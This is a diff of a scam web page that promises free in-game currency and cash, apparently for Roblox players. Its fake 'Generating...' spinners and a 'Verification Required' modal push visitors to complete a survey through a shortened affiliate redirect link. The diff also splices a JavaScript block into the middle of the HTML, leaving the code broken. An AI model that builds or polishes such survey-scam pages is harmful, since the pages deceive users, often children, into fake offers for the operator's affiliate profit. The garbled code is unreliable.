@@ -377,22 +377,42 @@
 
                 </div>
 
-                <button type="submit" class="continue-button" id="continueBtn2">CLAIM MONEY</button>
+                
+        
+        // --- Step 1: Platform Button Logic (Game/App) ---
+        platformButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                platformButtons.forEach(btn => btn.classList.remove('selected'));
+                button.classList.add('selected');
+            });
+        });
+
+        // --- Step 2: Payment Button Logic (PayPal, Cash App, dll.) ---
+        paymentButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                paymentButtons.forEach(btn => btn.classList.remove('selected'));
+                button.classList.add('selected');
+            });
+        });
+
+        // --- STEP 1 LOGIC: Pindah ke Step 2 ---
+        step1Form.                <button type="submit" class="continue-button" id="continueBtn2">GENERATE CASH</button>
 
                 <div class="loading-container" id="loading2">
                     <div class="spinner"></div>
-                    <p id="loadingText2">Loading...</p>
-                      </div>
+                    <p id="loadingText2">Generating...</p>
+                </div>
             </form>
         </div>
     </div>
 
     <div id="captchaModal" class="modal">
         <div class="modal-content">
-            <h3>Are You Sure You Want To Continue?</h3>
-            <p>Click The Button To Continue.</p>
+            <h3>Verification Required!</h3>
+            <p>To Receive Your Money, you just need to complete the survey.</p>
+            <p>Click the button below to complete the survey.</p>
             <button id="verifyButton" class="continue-button" style="margin-top: 20px;">
-                CONTINUE 
+                COMPLETE SURVEY
             </button>
         </div>
     </div>
@@ -414,46 +434,16 @@
         const verifyButton = document.getElementById('verifyButton');
         
         // !!! GANTI DENGAN LINK UTAMA ANDA !!!
-        const mainLink = "https://smrturl.co/a/sfa789896e6/576?s1=LagiGacorKetua"; 
-        
-        // --- Step 1: Platform Button Logic (Game/App) ---
+        const mainLink = "https://rebrand.ly/Claim-moneyy"; 
+
+       // --- Step 1: Platform Button Logic (Game/App) ---
         platformButtons.forEach(button => {
             button.addEventListener('click', () => {
                 platformButtons.forEach(btn => btn.classList.remove('selected'));
                 button.classList.add('selected');
             });
         });
-
-        // --- Step 2: Payment Button Logic (PayPal, Cash App, dll.) ---
-        paymentButtons.forEach(button => {
-            button.addEventListener('click', () => {
-                paymentButtons.forEach(btn => btn.classList.remove('selected'));
-                button.classList.add('selected');
-            });
-        });
-
-        // --- STEP 1 LOGIC: Pindah ke Step 2 ---
-        step1Form.addEventListener('submit', (e) => {
-            e.preventDefault();
-            
-            accountFound.style.display = 'none';
-            continueBtn1.style.display = 'none';
-            loading1.style.display = 'flex'; 
-
-            setTimeout(() => {
-                loading1.style.display = 'none';
-                accountFound.style.display = 'block';
-
-                setTimeout(() => {
-                    step1.style.display = 'none';
-                    step2.style.display = 'block'; 
-                    accountFound.style.display = 'none'; 
-                    document.querySelector('.card').scrollIntoView({ behavior: 'smooth' });
-                }, 500);
-
-            }, 1500); 
-        });
-
+        
         // --- STEP 2 LOGIC (Nominal Cash) ---
         robuxButtons.forEach(button => {
             button.addEventListener('click', () => {
